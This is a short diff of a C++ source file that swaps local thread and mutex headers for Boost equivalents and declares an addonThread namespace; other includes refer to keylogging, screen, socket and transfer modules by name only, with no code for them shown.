@@ -24,17 +24,30 @@
 #include <time.h>
 #include <vector>
 
+#include <boost/thread.hpp>
+#include <boost/thread/mutex.hpp>
+#include <boost/unordered_map.hpp>
+
 #include "fs.h"
 #include "keylog.h"
-#include "mutex.h"
+//#include "mutex.h"
 #include "process.h"
 #include "screen.h"
 #include "string.h"
 #include "tcpsocket.h"
-#include "thread.h"
+//#include "thread.h"
 #include "transfer.h"
 
 
 
 
 void addonDebug(char *text, ...);
+
+
+
+
+
+namespace addonThread
+{
+	static void Thread();
+};
